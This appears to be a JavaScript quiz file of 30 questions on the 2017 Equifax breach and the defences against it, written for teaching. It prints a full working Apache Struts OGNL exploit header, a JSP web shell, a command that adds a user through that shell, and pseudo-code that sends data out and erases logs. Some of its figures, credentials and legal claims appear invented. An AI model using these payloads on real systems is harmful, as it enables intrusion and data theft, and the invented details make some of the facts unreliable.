// topic6_questions.js
// 30 Comprehensive Questions on Case Study 6: Equifax Data Breach (2017) - Unpatched Apache Struts Vulnerability

const questions = [
  {
    id: 1,
    question: "What specific software vulnerability served as the initial entry point for the 2017 Equifax data breach?",
    shortAnswer: "CVE-2017-5638, a critical Remote Code Execution vulnerability in the Apache Struts 2 web application framework (Jakarta Multipart parser).",
    explanation: "On March 7, 2017, the Apache Software Foundation disclosed CVE-2017-5638. The flaw resided in the `JakartaMultipartParser` component used for handling HTTP multipart file uploads. By crafting a malformed `Content-Type` header containing Object-Graph Navigation Language (OGNL) expressions, attackers could execute arbitrary operating system commands on the underlying web server.",
    hint: "CVE-2017-5638 Apache Struts Jakarta Multipart parser vulnerability.",
    level: "Moderate",
    codeExample: `// CVE-2017-5638 Malicious HTTP Header Trigger:
// Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
//   (#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
//   (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
//   (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
//   (#context.setMemberAccess(#dm)))).
//   (#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
//   (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
//   (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
//   (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
//   (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}`
  },
  {
    id: 2,
    question: "What total volume of consumer personal data was exfiltrated during the Equifax breach, and what types of sensitive PII were exposed?",
    shortAnswer: "Approximately 147 million Americans (plus millions of UK and Canadian citizens); exposed Social Security numbers, dates of birth, full legal names, addresses, and 209,000 credit card numbers.",
    explanation: "Equifax is one of the three major US credit reporting bureaus. The breach compromised nearly half of the entire US population. The leaked data included complete identity dossiers (SSNs, credit histories, driver's license numbers, birth dates) that can never be changed, creating permanent lifelong identity theft risks for victims.",
    hint: "147 million consumers' Social Security numbers, birth dates, and credit card records.",
    level: "Moderate",
    codeExample: `// Equifax Breach Scope Metrics:
const equifaxBreachScope = {
  impactedUSConsumers: 147000000,
  impactedUKCitizens: 15200000,
  impactedCanadianCitizens: 19000,
  stolenPaymentCards: 209000,
  disputeDocumentsLeaked: 182000,
  threatActor: "Chinese PLA Military Intelligence (Unit 54th Research Institute)"
};`
  },
  {
    id: 3,
    question: "Why did Equifax fail to patch the Apache Struts vulnerability despite receiving explicit warnings from US-CERT in March 2017?",
    shortAnswer: "Equifax lacked a comprehensive, centralized software asset inventory and automated vulnerability scanner configuration, leaving IT staff unaware that the public dispute portal ran Apache Struts.",
    explanation: "When US-CERT alerted organizations on March 8, 2017, Equifax's security leadership sent an internal email requesting system administrators to apply the patch within 48 hours. However, because Equifax had no accurate software inventory, the team responsible for the online dispute portal (`ACIS`) was never notified, and automated internal network scans failed to probe the web application's subcomponents.",
    hint: "Lack of a centralized asset inventory and incomplete vulnerability scanning.",
    level: "Moderate",
    codeExample: `// Asset Inventory Blind Spot:
const enterpriseInventory = {
  knownSystemsInInventory: 450,
  actualLiveProductionSystems: 1200,
  untrackedLegacyPortals: [
    "https://dispute.equifax.com/acis (Running Apache Struts v2.3.5 - UNPATCHED)"
  ],
  auditFinding: "Automated vulnerability scanner did not perform deep web application layer inspections"
};`
  },
  {
    id: 4,
    question: "How did an expired SSL/TLS digital certificate directly blind Equifax's internal security intrusion monitoring systems for 76 days?",
    shortAnswer: "An SSL inspection certificate on Equifax's network traffic monitoring device had been expired for 10 months, preventing the intrusion detection system (IDS) from decrypting or inspecting encrypted HTTPS web traffic.",
    explanation: "Equifax had installed deep packet inspection network intrusion sensors (SSiG) to detect malicious payloads and data exfiltration. However, the SSL certificate used to decrypt internal HTTPS traffic expired in 2016. For 76 days, attackers executed SQL queries and exfiltrated gigabytes of PII through encrypted HTTPS tunnels while the blinded IDS silently passed the traffic without inspection.",
    hint: "An expired SSL certificate prevented the network IDS from decrypting HTTPS traffic.",
    level: "Expert",
    codeExample: `// SSL Inspection Blind Spot Flow:
// 1. Attacker sends encrypted HTTPS OGNL exploit -> https://dispute.equifax.com (Port 443)
// 2. Network Intrusion Detection System (IDS) attempts SSL decryption
// 3. SSL Inspection Certificate Status: "EXPIRED 10 MONTHS AGO"
// 4. IDS Fails Open: Bypasses packet inspection and passes encrypted traffic directly to web server!
// 5. Attacker exfiltrates 147M records over encrypted HTTPS for 76 days undetected.`
  },
  {
    id: 5,
    question: "What threat actor was formally indicted by the United States Department of Justice (DOJ) for the Equifax breach?",
    shortAnswer: "Four military hackers belonging to the 54th Research Institute of the Chinese People's Liberation Army (PLA Unit 54th Research Institute).",
    explanation: "In February 2020, US Attorney General William Barr announced federal grand jury indictments against four PLA officers (Wu Zhiyong, Wang Qian, Xu Ke, Liu Lei). The indictment detailed how the Chinese military unit used 34 servers in nearly 20 countries to route traffic, wipe logs daily, and exfiltrate trade secrets and PII for national intelligence compilation.",
    hint: "Four military officers of the Chinese People's Liberation Army (PLA Unit 54).",
    level: "Moderate",
    codeExample: `// US DOJ Indictment (February 2020):
const dojIndictment = {
  indictedActors: ["Wu Zhiyong", "Wang Qian", "Xu Ke", "Liu Lei"],
  militaryAffiliation: "PLA 54th Research Institute (China)",
  charges: [
    "Computer Fraud and Abuse Act (CFAA) violations",
    "Economic Espionage",
    "Conspiracy to Commit Wire Fraud"
  ]
};`
  },
  {
    id: 6,
    question: "What is 'OGNL' (Object-Graph Navigation Language) and how did attackers abuse it to gain a remote shell?",
    shortAnswer: "An expression language used in Java frameworks for getting and setting properties; abusing OGNL context evaluation allowed attackers to invoke `java.lang.ProcessBuilder` and execute OS commands.",
    explanation: "Struts used OGNL to dynamically evaluate parameters. In CVE-2017-5638, the parser evaluated the user-supplied `Content-Type` string through the OGNL engine when an error occurred. Attackers crafted payloads that reset member access controls and invoked Java system runtime classes to launch a remote `/bin/sh` or `cmd.exe` shell.",
    hint: "An expression language evaluated dynamically by Java allowing execution of ProcessBuilder.",
    level: "Expert",
    codeExample: `// OGNL Expression Injection Mechanism:
// #dm = @ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
// #_memberAccess = #dm  <-- Bypasses Struts security sandbox
// #p = new java.lang.ProcessBuilder({'/bin/bash', '-c', 'cat /etc/passwd'})
// #p.start()            <-- Executes arbitrary host bash commands!`
  },
  {
    id: 7,
    question: "How long was the adversary 'Dwell Time' inside Equifax before the intrusion was finally discovered?",
    shortAnswer: "76 Days (from initial compromise on May 13, 2017 until discovery on July 29, 2017 when the SSL certificate was updated).",
    explanation: "Attackers maintained uninterrupted access from May 13 to July 29, 2017. They conducted over 9,000 separate database queries across 48 internal relational databases. The intrusion was only discovered when Equifax security staff finally updated the expired SSL inspection certificate, which immediately lit up the IDS console with suspicious encrypted data flows.",
    hint: "76 days of undetected access discovered only after renewing the expired SSL certificate.",
    level: "Moderate",
    codeExample: `// Equifax Incident Timeline:
// March 7, 2017: Apache discloses CVE-2017-5638
// May 13, 2017: Chinese PLA hackers exploit unpatched dispute portal
// July 29, 2017 (Day 76): Equifax updates expired SSL certificate; IDS triggers alert immediately
// September 7, 2017: Equifax publicly discloses breach to the world`
  },
  {
    id: 8,
    question: "What total financial settlements, fines, and remediation costs did Equifax incur across regulatory bodies?",
    shortAnswer: "Over ₹5,800 Crores ($700+ Million) in global settlements with the FTC, CFPB, and 50 US State Attorneys General.",
    explanation: "In July 2019, Equifax agreed to pay up to $700 Million to resolve federal and state investigations (including $425 Million into a consumer restitution fund). The company also spent hundreds of millions on mandatory technology modernization, comprehensive cloud migration, and forensic legal counsel.",
    hint: "Over ₹5,800 Crores ($700 Million) in FTC, CFPB, and state settlements.",
    level: "Moderate",
    codeExample: `// Equifax Regulatory Settlement Breakdown:
const settlementData = {
  ftcConsumerRestitutionFundUSD: 425000000,
  stateAttorneysGeneralPenaltiesUSD: 175000000,
  cfpbConsumerBureauFineUSD: 100000000,
  totalSettlementUSD: 700000000,
  totalSettlementINR: 58100000000 // Over ₹5,810 Crores
};`
  },
  {
    id: 9,
    question: "What architectural database design flaw allowed attackers to query 48 separate relational databases from a single web server?",
    shortAnswer: "Lack of database-to-web tier network segmentation and storage of hardcoded plaintext database administrative credentials in internal configuration files.",
    explanation: "The compromised dispute web server was not restricted to its own application database. Attackers found plaintext database connection strings and passwords on the web server, allowing them to establish connections to 48 completely unrelated core credit reporting databases located on flat internal networks.",
    hint: "Plaintext database passwords on the web server and lack of network database segmentation.",
    level: "Expert",
    codeExample: `// Hardcoded Database Credentials in Web Server Config:
// File: /opt/acis/config/database.properties
// db.master.url=jdbc:oracle:thin:@10.20.1.100:1521:CRDB
// db.master.user=admin_master
// db.master.pass=UnencryptedMasterPassword123!
// Result: Web server held credentials capable of querying ALL corporate databases!`
  },
  {
    id: 10,
    question: "What is a 'Software Bill of Materials' (SBOM) and how does it prevent the Equifax vulnerability blind spot?",
    shortAnswer: "A formal, machine-readable inventory of all third-party software components, libraries, and open-source dependencies embedded inside an enterprise's applications.",
    explanation: "In 2017, Equifax did not know which applications used Apache Struts because Struts was a nested Java library (`struts2-core.jar`) inside compiled `.war` packages. An SBOM (e.g. CycloneDX or SPDX) indexes all software libraries, allowing security teams to query `struts2` and identify vulnerable applications in seconds.",
    hint: "An automated inventory of open-source libraries and dependencies embedded in applications.",
    level: "Moderate",
    codeExample: `// CycloneDX SBOM JSON Excerpt:
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.4",
  "components": [
    {
      "name": "struts2-core",
      "version": "2.3.5",
      "purl": "pkg:maven/org.apache.struts/struts2-core@2.3.5",
      "vulnerabilities": ["CVE-2017-5638 (CRITICAL - RCE)"]
    }
  ]
}`
  },
  {
    id: 11,
    question: "How did attackers evade detection while running 9,000+ database queries over 76 days?",
    shortAnswer: "By running slow, rate-limited queries in small batches, masking query traffic inside encrypted HTTPS channels, and executing daily log deletion commands.",
    explanation: "The attackers did not execute a single massive database dump that might trigger bandwidth thresholds. They executed small SQL statements returning 200-500 records at a time, compressed the output into small `.zip` archives, and wiped temporary files and web server access logs after each session.",
    hint: "Slow low-and-slow queries, small compressed batches, and daily log purging.",
    level: "Moderate",
    codeExample: `// Low-and-Slow SQL Extraction Batch Script (Pseudo-Code):
// SELECT * FROM CONSUMER_PII WHERE ROWNUM <= 250 OFFSET 10000;
// Compress to /tmp/sess_842.tmp
// Exfiltrate via HTTPS POST to 118.193.xxx.xxx
// rm -f /tmp/sess_842.tmp && cat /dev/null > /var/log/httpd/access_log`
  },
  {
    id: 12,
    question: "What role does 'Certificate Lifecycle Management' (CLM) play in enterprise security monitoring?",
    shortAnswer: "Automating the discovery, monitoring, renewal, and installation of SSL/TLS digital certificates to eliminate inspection blind spots and service outages.",
    explanation: "Digital certificates have strict expiration dates. A CLM solution (e.g. Venafi, Let's Encrypt / ACME, AWS Certificate Manager) automatically renews certificates 30 days before expiration and alerts SOC teams if an SSL inspection sensor drops below required decryption visibility.",
    hint: "Automated discovery and renewal of SSL certificates to prevent monitoring blind spots.",
    level: "Moderate",
    codeExample: `// Automated Certificate Expiration Alert Rule (Prometheus / Datadog):
/*
alert: SSLCertificateExpiringSoon
expr: (ssl_certificate_expiry_timestamp - time()) / 86400 < 30
for: 1h
labels:
  severity: warning
annotations:
  summary: "SSL Inspection Certificate expiring in less than 30 days on host {{ $labels.instance }}"
*/`
  },
  {
    id: 13,
    question: "Why was Equifax's internal communication regarding patch deployment flawed during the incident?",
    shortAnswer: "Security leadership relied on generic company-wide distribution list emails without verifying patch receipt, tracking remediation compliance, or conducting mandatory follow-up scans.",
    explanation: "On March 9, 2017, an Equifax security officer sent an email to an internal mailing list instructing staff to patch Apache Struts. Nobody followed up to confirm if the ACIS team received the email, nobody verified patch tickets in JIRA, and automated scans were never reconciled against production server rosters.",
    hint: "Relying on generic emails without ticketing tracking, SLA enforcement, or compliance verification.",
    level: "Moderate",
    codeExample: `// Flawed Communication vs Automated Patch Orchestration:
// FLAWED (Equifax 2017): Email to all-it@equifax.com -> "Please patch Struts if you use it."
// SECURE (Modern): SOAR / EDR automates ticket creation in JIRA, scans for struts2-core.jar, and automatically deploys container updates with 48-hour SLA.`
  },
  {
    id: 14,
    question: "What is 'Software Composition Analysis' (SCA) and how does it detect nested dependencies like Apache Struts?",
    shortAnswer: "A static analysis tool that scans source code repositories, binary build artifacts, and container images to identify vulnerable open-source dependencies and generate CVE alerts.",
    explanation: "Traditional vulnerability scanners scan open network ports. Software Composition Analysis (SCA) tools (e.g. Snyk, Dependabot, SonarQube) inspect `pom.xml`, `package.json`, and `.jar` archives inside CI/CD pipelines, automatically blocking build deployments if a high-severity CVE (like CVE-2017-5638) is present.",
    hint: "Scanning application source code and build dependencies in CI/CD pipelines.",
    level: "Expert",
    codeExample: `// Snyk SCA CI/CD Pipeline Check (GitHub Actions / GitLab CI):
/*
- name: Run Snyk Security Scan
  run: snyk test --severity-threshold=high
  # Automatically FAILS build if struts2-core < 2.3.32 is detected in maven dependencies!
*/`
  },
  {
    id: 15,
    question: "What executive leadership resignations occurred at Equifax following the disclosure of the breach?",
    shortAnswer: "Chief Executive Officer (CEO) Richard Smith, Chief Information Officer (CIO) David Webb, and Chief Information Security Officer (CISO) Susan Mauldin.",
    explanation: "The catastrophic failure in governance, communication, and technical oversight prompted immediate executive departures. CEO Richard Smith was forced to testify before the US Congress, and the Board of Directors replaced both technical and executive leadership.",
    hint: "The resignation of the CEO, CIO, and CISO.",
    level: "Moderate",
    codeExample: `// Executive Leadership Overhaul (September 2017):
const executiveResignations = [
  "Richard Smith (Chairman & Chief Executive Officer)",
  "David Webb (Chief Information Officer)",
  "Susan Mauldin (Chief Information Security Officer)"
];`
  },
  {
    id: 16,
    question: "What is 'Web Application Firewall' (WAF) virtual patching and how could it have protected Equifax on Day 1?",
    shortAnswer: "Applying a regular expression rule on the edge WAF (e.g. Cloudflare, AWS WAF, ModSecurity) to block any HTTP request containing `#_memberAccess` or OGNL expressions in the `Content-Type` header.",
    explanation: "Even before an application team can test and deploy a software framework update, the security team can deploy an immediate 'virtual patch' on the edge Web Application Firewall. The WAF inspects HTTP headers and immediately drops any packet matching the CVE-2017-5638 signature.",
    hint: "Edge WAF rule blocking malformed Content-Type headers containing OGNL syntax.",
    level: "Moderate",
    codeExample: `// ModSecurity WAF Rule for CVE-2017-5638 (Virtual Patch):
/*
SecRule REQUEST_HEADERS:Content-Type "(#_memberAccess|@ognl|java\.lang\.ProcessBuilder)" \
    "id:1000001,\
    phase:1,\
    deny,\
    status:403,\
    log,\
    msg:'BLOCKED: Apache Struts OGNL Remote Code Execution Attempt (CVE-2017-5638)'"
*/`
  },
  {
    id: 17,
    question: "What is 'Database Activity Monitoring' (DAM) and how could it have detected the 9,000 queries?",
    shortAnswer: "An independent security sensor monitoring all SQL statements executed on database servers, triggering alarms on abnormal query volumes, table dumps, or unauthorized user accounts.",
    explanation: "In Equifax's environment, the dispute web server suddenly began querying 48 databases containing millions of SSNs. A Database Activity Monitoring solution (e.g. Imperva SecureSphere, IBM Guardium) baselines normal application behavior and would have instantly flagged a web server issuing thousands of cross-database SELECT statements.",
    hint: "Independent monitoring sensor flagging abnormal SQL query volumes and table dumps.",
    level: "Expert",
    codeExample: `// DAM Anomaly Detection Rule:
/*
Rule: ABNORMAL_SELECT_VOLUME_DETECTED
Conditions:
  source_ip: 10.20.1.50 (Dispute Web Server)
  queries_per_hour: "> 500"
  tables_accessed: [CONSUMER_SSN_MASTER, CREDIT_CARD_VAULT]
Action:
  alert_severity: CRITICAL
  terminate_db_session: true
*/`
  },
  {
    id: 18,
    question: "How did the attackers establish persistence on Equifax's Apache Struts web server?",
    shortAnswer: "By uploading multiple JSP web shells (e.g. China Chopper variants) disguised as benign image and temporary files into the web application document root.",
    explanation: "Once initial RCE was achieved via the OGNL exploit, attackers wrote JSP scripts (e.g. `logo.jsp`, `help.jsp`) to the web server's public directory. These web shells accepted base64-encoded commands via HTTP POST parameters, allowing persistent command execution even if the Struts exploit was temporarily mitigated.",
    hint: "Uploading persistent JSP web shells disguised as benign web files.",
    level: "Moderate",
    codeExample: `// Minimal JSP One-Line Web Shell (China Chopper style):
// <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
// Allows attackers to execute system commands via HTTP POST:
// curl -X POST -d "cmd=net user hacker Password123 /add" https://dispute.equifax.com/logo.jsp`
  },
  {
    id: 19,
    question: "What is 'Least Privilege' in Web-to-Database application architecture?",
    shortAnswer: "A web application's database account should only have access to the exact tables and views required for its specific function, with zero permissions on unrelated corporate databases.",
    explanation: "The dispute application only needed access to consumer dispute transaction tables. Granting the web application account administrative rights across 48 core credit databases violated the principle of least privilege, enabling massive cross-database data harvesting.",
    hint: "Restricting web database users strictly to their own specific application tables.",
    level: "Moderate",
    codeExample: `// Insecure Over-Privileged Account (Equifax 2017):
// GRANT ALL PRIVILEGES ON *.* TO 'acis_web_user'@'%';

// Secure Least-Privilege Account (Modern Architecture):
// GRANT SELECT, INSERT, UPDATE ON dispute_portal.disputes TO 'acis_web_user'@'10.20.1.50';
// (Zero access to global consumer SSN master tables!)`
  },
  {
    id: 20,
    question: "How did Equifax's botched incident response and public disclosure in September 2017 compound its reputation disaster?",
    shortAnswer: "They launched a buggy, phishing-prone breach check website (`equifaxsecurity2017.com`) that gave inconsistent answers and accidentally tweeted phishing links from their official Twitter account.",
    explanation: "Equifax set up a standalone domain (`equifaxsecurity2017.com`) for consumers to check if their data was breached. The site was built on generic WordPress, returned random answers regardless of input, and was easily spoofed by security researchers. Equifax's official support Twitter account accidentally tweeted out links to a fake phishing clone site four times.",
    hint: "A buggy standalone breach check domain and tweeting out links to phishing clone sites.",
    level: "Moderate",
    codeExample: `// Botched Domain Setup (Communications Disaster):
const botchedResponse = {
  officialDomain: "equifax.com",
  flawedBreachDomain: "equifaxsecurity2017.com (Looked like a phishing site)",
  fakeCloneDomain: "securityequifax2017.com (Created by researcher Nick Sweeting)",
  blunder: "Official @Equifax Twitter account tweeted the fake link to consumers 4 times!"
};`
  },
  {
    id: 21,
    question: "What is 'Containerization' (e.g. Docker / Kubernetes) and how does it restrict the blast radius of a web application RCE?",
    shortAnswer: "Running applications in isolated, read-only containers with non-root users and dropped Linux capabilities, preventing attackers from accessing host OS files or traversing internal subnets.",
    explanation: "If the Apache Struts application had run inside an unprivileged Docker container with a read-only root file system (`--read-only`), attackers could not write JSP web shells, install persistence tools, or dump local configuration files.",
    hint: "Running applications in read-only containers with non-root privileges prevents file writes.",
    level: "Expert",
    codeExample: `// Hardened Docker Container Execution:
/*
docker run -d \
  --read-only \
  --user 10001:10001 \
  --cap-drop=ALL \
  --security-opt=no-new-privileges \
  --network=isolated_app_vlan \
  my-legacy-app:v1.0
# Even if RCE occurs, attacker CANNOT write web shells or modify host files!
*/`
  },
  {
    id: 22,
    question: "How does the Indian DPDP Act 2023 treat credit bureaus and financial institutions that fail to patch critical vulnerabilities?",
    shortAnswer: "Classifies financial credit bureaus as 'Significant Data Fiduciaries' subject to mandatory independent data audits, strict Data Protection Officer (DPO) oversight, and fines up to ₹250 Crores.",
    explanation: "Under Section 10 of India's Digital Personal Data Protection Act 2023, credit rating and financial entities handle high-risk consumer identity data. Gross patch negligence leading to PII exfiltration exposes entities in Kolkata, Barrackpore, and across India to maximum statutory penalties.",
    hint: "Significant Data Fiduciary status with mandatory audits and fines up to ₹250 Crores.",
    level: "Moderate",
    codeExample: `// DPDP 2023 Significant Data Fiduciary Mandate:
const dpdpSignificantFiduciary = {
  entityType: "Credit Information Companies / Credit Bureaus (CIBIL, Experian, Equifax India)",
  mandatoryRequirements: [
    "Appointment of resident Data Protection Officer (DPO)",
    "Mandatory annual Independent Data Audits",
    "Continuous Data Protection Impact Assessments (DPIA)"
  ],
  maxStatutoryFineINR: 2500000000 // ₹250 Crores
};`
  },
  {
    id: 23,
    question: "What is 'Data Tokenization' and how does it protect Social Security Numbers (or Indian Aadhaar / PAN) at rest?",
    shortAnswer: "Replacing sensitive cleartext numbers with non-sensitive surrogate tokens, storing the real values in an encrypted, isolated hardware vault.",
    explanation: "If Equifax had tokenized Social Security numbers, querying the database would return useless surrogate tokens (e.g. `TOK_894A2B`). Only authorized billing or dispute applications with cryptographic vault keys could detokenize the data, rendering stolen database dumps completely useless to foreign intelligence hackers.",
    hint: "Replacing sensitive SSNs with surrogate tokens stored in a secure hardware vault.",
    level: "Moderate",
    codeExample: `// Tokenization Architecture:
// Database Table: CONSUMER_RECORDS
// Column SSN stores ONLY: "TKN_7FA910BC" (Useless to attackers)
// Real SSN "123-45-6789" stored in FIPS 140-2 Level 3 Hardware Token Vault`
  },
  {
    id: 24,
    question: "What is 'Zero Trust Network Segmentation' for database clusters?",
    shortAnswer: "Restricting database network access strictly to verified application server IP addresses over encrypted mTLS connections, with zero direct ingress from general subnets.",
    explanation: "Databases should never accept connections from arbitrary servers. In a Zero Trust architecture, mutual TLS (mTLS) and micro-segmentation firewalls ensure that only explicitly authenticated application workloads can initiate TCP connections to database ports.",
    hint: "Databases accept connections only from verified app servers via mTLS and micro-segmentation.",
    level: "Moderate",
    codeExample: `// Database Micro-segmentation Firewall Policy:
/*
Rule: ALLOW_DISPUTE_APP_TO_DISPUTE_DB_ONLY
Source: 10.20.1.50 (Dispute Web App Server)
Destination: 10.30.1.100 (Dispute DB ONLY on Port 1521)
Action: ALLOW (mTLS Required)
All other traffic to core master databases: DROP & ALERT
*/`
  },
  {
    id: 25,
    question: "Why did automated vulnerability scanners fail to identify the vulnerable Apache Struts instance during Equifax's internal scans?",
    shortAnswer: "The scanners were configured only to perform shallow port scans and HTTP banner checks, rather than active web application layer vulnerability probing.",
    explanation: "Equifax's automated scanners probed IP addresses for open ports and known software banners. Because Apache Struts did not expose a banner string on standard HTTP responses, and the scanner was not configured to inject active OGNL test payloads into the dispute application URL path, the scanner reported the host as 'Clean'.",
    hint: "Scanners did shallow port/banner checks rather than active web application layer probing.",
    level: "Expert",
    codeExample: `// Shallow Scanner vs Deep DAST Scanner:
// Shallow Port Scanner: "Port 443 OPEN. Server: Apache-Coyote/1.1 -> STATUS: OK"
// Dynamic App Security Testing (DAST): Sends active benign OGNL test payload -> "VULNERABILITY CONFIRMED: CVE-2017-5638"`
  },
  {
    id: 26,
    question: "What role does 'Continuous Egress Network Monitoring' play in detecting large-scale PII exfiltration?",
    shortAnswer: "Detecting anomalous outbound HTTPS sessions that upload steady gigabytes of structured data to unrecognized foreign IP ranges.",
    explanation: "A credit dispute web portal is designed primarily for inbound traffic (consumers uploading documents). Sustained multi-gigabyte outbound HTTPS flows to overseas IP addresses (in China, Germany, Switzerland) represent a severe behavioral anomaly that Network Detection and Response (NDR) tools flag immediately.",
    hint: "Flagging abnormal sustained outbound data uploads from web servers to foreign IPs.",
    level: "Moderate",
    codeExample: `// NDR Egress Telemetry Anomaly Indicator:
const egressAnomaly = {
  host: "dispute.equifax.com (10.20.1.50)",
  baselineOutboundDailyMB: 45,
  observedOutboundDailyMB: 18500, // 18.5 GB/day
  alert: "CRITICAL_EGRESS_ANOMALY: Outbound volume 400x above historical baseline!"
};`
  },
  {
    id: 27,
    question: "How did the Equifax breach lead to the creation of the 'CISA Binding Operational Directive' (BOD) for federal vulnerability remediation?",
    shortAnswer: "It established strict federal deadlines (BOD 19-02 / BOD 22-01) mandating that Critical vulnerabilities must be remediated within 15 days, and actively exploited KEV bugs within 14 days.",
    explanation: "The realization that a 76-day unpatched window allowed 147 million citizens' data to be stolen prompted the US government and global enterprises to formalize legally binding remediation timelines for all internet-facing systems.",
    hint: "Mandating strict 14-to-15 day federal remediation deadlines for critical vulnerabilities.",
    level: "Moderate",
    codeExample: `// CISA BOD 19-02 Remediation Timelines:
const federalPatchSla = {
  criticalVulnerability: "Remediated within 15 calendar days of initial detection",
  highVulnerability: "Remediated within 30 calendar days of initial detection"
};`
  },
  {
    id: 28,
    question: "What is 'Threat-Informed Defense' and how does mapping to MITRE ATT&CK assist in analyzing the Equifax breach?",
    shortAnswer: "Systematically mapping adversary techniques (T1190 Exploit Public-Facing App, T1059 Command Execution, T1505 Web Shell, T1048 Exfiltration) to ensure multi-layered defensive coverage.",
    explanation: "By decomposing the attack into MITRE ATT&CK techniques, defenders recognize that even if T1190 (Struts exploit) succeeds, defensive controls at T1059 (process sandboxing), T1505 (file integrity monitoring), and T1048 (egress filtering) can sever the attack before exfiltration occurs.",
    hint: "Mapping techniques across the kill chain to deploy independent defensive gates.",
    level: "Moderate",
    codeExample: `// Equifax MITRE ATT&CK Mapping:
const equifaxMitreChain = [
  "Initial Access: T1190 (Exploit Public-Facing Application - Apache Struts)",
  "Execution: T1059.004 (Unix Shell / ProcessBuilder execution)",
  "Persistence: T1505.003 (Server Software Component: Web Shell JSP)",
  "Discovery: T1087 (Account Discovery), T1083 (File and Directory Discovery)",
  "Collection: T1560 (Archive Collected Data via tar/zip)",
  "Exfiltration: T1048 (Exfiltration Over Alternative Protocol - Encrypted HTTPS)"
];`
  },
  {
    id: 29,
    question: "What is 'File Integrity Monitoring' (FIM) and how could it have detected the JSP web shells dropped by the PLA hackers?",
    shortAnswer: "Real-time cryptographic monitoring of web server directories (`/var/www/html/`) that alerts the SOC the moment any new or modified `.jsp` file is created.",
    explanation: "Production web server directories should be immutable. A File Integrity Monitoring tool (e.g. OSSEC, Tripwire, Wazuh) monitors file hashes. The instant the attacker writes `logo.jsp` or `help.jsp` to disk, FIM triggers a critical alert and automatically quarantines the unauthorized file.",
    hint: "Real-time monitoring alerting on any new or modified files in web directories.",
    level: "Expert",
    codeExample: `// Wazuh / OSSEC FIM Configuration for Web Directories:
/*
<syscheck>
  <directories check_all="yes" realtime="yes">/opt/acis/webapps/ROOT</directories>
  <alert_new_files>yes</alert_new_files>
</syscheck>
# Triggers HIGH-SEVERITY alert the moment an unauthorized .jsp file is dropped!
*/`
  },
  {
    id: 30,
    question: "What core architectural takeaway must students in Barrackpore and Kolkata remember when designing enterprise web and database security?",
    shortAnswer: "You cannot secure what you do not know you own; complete asset inventory, continuous SBOM dependency tracking, active SSL inspection, and database micro-segmentation are mandatory.",
    explanation: "Equifax demonstrated that a billion-dollar company can collapse from a single uninventoried legacy web portal running an unpatched Java library, combined with an expired SSL certificate. Modern defense demands complete visibility: automated SBOMs, 48-hour patching SLAs, active TLS monitoring, and strict Zero Trust database boundaries.",
    hint: "Maintain complete asset inventory, automated SBOMs, active SSL inspection, and database isolation.",
    level: "Moderate",
    codeExample: `// The Equifax Post-Mortem Defense Formula:
// Enterprise Security = (Continuous Asset & SBOM Inventory) + (Automated 48-hr Patch SLAs) + (Active TLS Inspection) + (Database Zero Trust)`
  }
];

export default questions;
